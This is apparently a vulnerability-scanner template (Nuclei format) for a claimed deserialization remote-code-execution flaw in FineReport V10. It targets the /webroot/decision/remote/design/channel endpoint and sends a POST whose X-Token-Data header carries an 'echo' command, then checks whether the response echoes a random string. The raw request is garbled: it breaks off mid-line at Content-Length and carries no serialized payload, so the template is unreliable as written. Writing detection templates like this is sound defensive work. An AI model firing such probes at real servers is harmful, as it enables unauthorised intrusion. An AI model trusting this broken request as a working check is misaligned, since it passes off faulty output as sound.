id: finereport-v10-deserialization-rce
info:
  name: FineReport V10 Deserialization RCE Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    FineReport V10 contains a deserialization vulnerability in the /webroot/decision/remote/design/channel endpoint. An attacker can execute arbitrary code on the server by sending crafted serialized data.
  reference:
    - https://www.finereport.com
  tags: rce, deserialization

variables:
  random_string: '{{rand_text_alphanumeric(6)}}'

http:
  - raw:
      - |
        POST /webroot/decision/remote/design/channel HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream
        X-Token-Data: echo {{random_string}}
        Content-Length: {{len(".
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{random_string}}"
      - type: status
        status:
          - 200
